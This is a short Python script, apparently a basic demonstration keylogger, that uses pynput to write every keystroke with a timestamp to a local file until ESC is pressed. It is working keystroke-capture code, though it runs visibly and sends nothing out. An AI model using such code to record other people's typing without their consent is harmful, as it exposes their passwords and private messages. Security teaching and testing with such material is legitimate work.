from pynput import keyboard
import os
from datetime import datetime

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    if os.path.exists(log_file):
        os.remove(log_file)

    print("[*] Keylogger started. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
